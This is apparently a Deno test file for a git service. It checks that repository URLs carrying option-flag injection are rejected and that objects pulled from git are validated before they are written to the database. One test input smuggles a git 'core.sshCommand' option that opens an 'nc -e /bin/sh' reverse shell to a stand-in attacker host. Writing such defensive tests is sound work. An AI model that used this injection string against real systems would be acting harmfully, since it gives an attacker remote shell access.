/**
 * tests/security_git.test.ts
 *
 * Security tests for git service and @git/pull command vulnerabilities.
 *
 * #36 — GitService passes unsanitized user input to Deno.Command("git", ...)
 *        A URL starting with "-" could be treated as a git option flag.
 * #38 — @git/pull writes JSON.parse(content) directly to DB without schema
 *        validation — arbitrary fields can overwrite any database object.
 */
import { assertEquals, assertRejects } from "@std/assert";
import { GitService } from "../src/services/git/index.ts";

const OPTS = { sanitizeResources: false, sanitizeOps: false };

// ---------------------------------------------------------------------------
// #36 — git.init() must reject URLs that start with "-" (flag injection)
// ---------------------------------------------------------------------------

Deno.test("#36 — git.init() rejects URLs starting with '-'", OPTS, async () => {
  const svc = new GitService();
  // A URL starting with "-" is treated by git as a command-line option.
  // This MUST throw before ever spawning the subprocess.
  await assertRejects(
    () => svc.init("-u http://attacker.com"),
    Error,
    "Invalid",
  );
});

Deno.test("#36 — git.init() rejects URLs with embedded '--' option injection", OPTS, async () => {
  const svc = new GitService();
  await assertRejects(
    () => svc.init("https://legit.com --config core.sshCommand='nc -e /bin/sh attacker 80'"),
    Error,
    "Invalid",
  );
});

Deno.test("#36 — git.init() accepts a well-formed https URL", OPTS, async () => {
  const svc = new GitService();
  // We can't actually clone in a unit test, but we CAN verify the validation
  // does NOT reject a legitimate-looking URL.  The clone will fail (no network)
  // but the error must come from git, not from our input guard.
  let caughtMsg = "";
  try {
    await svc.init("https://github.com/example/repo.git");
  } catch (e) {
    caughtMsg = (e as Error).message;
  }
  // Should NOT be our "Invalid URL" guard message
  assertEquals(caughtMsg.startsWith("Invalid"), false);
});

// ---------------------------------------------------------------------------
// #38 — validateGitObject() must reject objects missing required fields
//        and reject objects with unknown extra fields that could overwrite
//        sensitive DB data (e.g. flags, password).
// ---------------------------------------------------------------------------

// We test the validation function directly once it exists.
// Until then, import a guard that doesn't exist yet — this will fail to compile
// or throw at runtime, confirming RED state.
Deno.test("#38 — validateGitObject rejects object missing 'id' field", OPTS, async () => {
  const { validateGitObject } = await import("../src/commands/git.ts");
  const result = validateGitObject({ flags: "wizard", data: { name: "hacked" } });
  assertEquals(result, false);
});

Deno.test("#38 — validateGitObject rejects object with forbidden 'password' field", OPTS, async () => {
  const { validateGitObject } = await import("../src/commands/git.ts");
  const result = validateGitObject({ id: "1", flags: "wizard", data: { name: "x", password: "injected" } });
  assertEquals(result, false);
});

Deno.test("#38 — validateGitObject accepts a safe object", OPTS, async () => {
  const { validateGitObject } = await import("../src/commands/git.ts");
  const result = validateGitObject({ id: "42", flags: "room", data: { name: "Safe Room", description: "ok" } });
  assertEquals(result, true);
});
